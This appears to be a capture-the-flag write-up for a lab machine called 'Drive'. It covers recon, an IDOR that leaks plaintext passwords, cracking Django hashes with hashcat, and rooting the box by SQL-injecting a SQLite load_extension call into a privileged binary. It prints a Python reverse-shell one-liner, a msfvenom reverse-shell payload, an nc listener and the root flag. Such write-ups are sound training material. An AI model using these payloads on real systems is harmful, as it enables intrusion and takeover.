## Recon time
```
└─# nmap 10.10.11.235
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-15 03:31 GMT
Nmap scan report for drive.htb (10.10.11.235)
Host is up (2.6s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
```
## Shell

python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' 

Not work
## Fuzz for idor
when i reserve files i got like : http://drive.htb/100/block/. Now i use burp to fuzz that endepoint number from 3 digit 
and found
`hey team after the great success of the platform we need now to continue the work.
on the new features for ours platform.
I have created a user for martin on the server to make the workflow easier for you please use the password "Xk4@KjyrYv8t194L!".
please make the necessary changes to the code before the end of the month
I will reach you soon with the token to apply your changes on the repo
thanks! `

## Escalation
used linpeash
`https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
108M -rwxrwxr-x 1 1000 1000 108M Dec 25  2022 /usr/local/bin/gitea
`

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -  
```
```
sqlite> SELECT * FROM accounts_customuser;
21|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|2022-12-26 05:48:27.497873|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04
22|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f|2022-12-24 12:55:10|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02
23|sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004|2022-12-24 13:17:45|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f|2022-12-24 16:51:53|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15
30|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3|2022-12-26 05:43:40.388717|1|admin|||admin@drive.htb|1|1|2022-12-26 05:30:58.003372
```
But these password not give me anything
## Port forward with the filtered port Gitea
ssh -L 4000:localhost:3000 user@ip

## Re-scan
I rescan the webapp and found other sensituve files
 http://drive.htb/98/block/
 `hi team
have a great day.
we are testing the new edit functionality!
it seems to work great!`

and http://drive.htb/99/block/

` hi team
please we have to stop using the document platform for the chat
+I have fixed the security issues in the middleware
thanks! :) `

and : http://drive.htb/101/block/
`hi team!
me and my friend(Cris) created a new scheduled backup plan for the database
the database will be automatically highly compressed and copied to /var/www/backups/ by a small bash script every day at 12:00 AM
*Note: the backup directory may change in the future!
*Note2: the backup would be protected with strong password! don't even think to crack it guys! :) `
`H@ckThisP@ssW0rDIfY0uC@n:)`


## Crack pass
Tom hash : sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
`└─# hashcat -a0 -m124 hashes.txt /usr/share/wordlists/rockyou.txt`
```
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 124 (Django (SHA-1))
Hash.Target......: sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b252...69525a
Time.Started.....: Sun Oct 15 06:37:38 2023 (0 secs)
Time.Estimated...: Sun Oct 15 06:37:38 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1638.1 kH/s (0.19ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 641024/14344385 (4.47%)
Rejected.........: 0/641024 (0.00%)
Restore.Point....: 640000/14344385 (4.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: jonny05 -> joanax
Hardware.Mon.#1..: Temp: 79c Util: 61%

Started: Sun Oct 15 06:37:06 2023
Stopped: Sun Oct 15 06:37:40 2023
```
## Way to Root

```
/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line 'SELECT id,last_login,is_superuser,username,email,is_staff,is_active,date_joined FROM accounts_customuser;'
/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line 'SELECT id,name FROM accounts_g;'
/usr/bin/sudo -u www-data /opt/server-health-check.sh
Enter username to activate account: 
Error: Username cannot be empty.
/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line 'UPDATE accounts_customuser SET is_active=1 WHERE username="%s";'
Activating account for user '%s'...
/usr/bin/sudo -u www-data /usr/bin/tail -1000 /var/log/nginx/access.log
doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: 
exiting...
please Select a valid option...
PATH
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
Enter password for 
moriarty
findMeIfY0uC@nMr.Holmz!
Welcome...!
Invalid username or password.
xeon_phi
haswell
```



### ROOT the box

Rev shell 
`msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf-so -o 0.so`
Upload it to tom's home directory
Then `nc -lnvp your port`
Payload to be used within the binary option 5 
`"+load_extension(char(46,47,48))+"`
Including the double quotes
That will give you a shell as root

`Select option: 5
Enter username to activate account: "+load_extension(char(46,47,48))+"
Activating account for user '"+load_extension(char(46,47,48))+"'...
`
```
└─# nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.235] 34858
id
uid=0(root) gid=0(root) groups=0(root),1003(tom)
whoami
root
pwd
/home/tom
cd
pwd
/home/tom
cd /root
ls
root.txt
cat root.txt
f62cb458a61486006f86d7989b611f18
```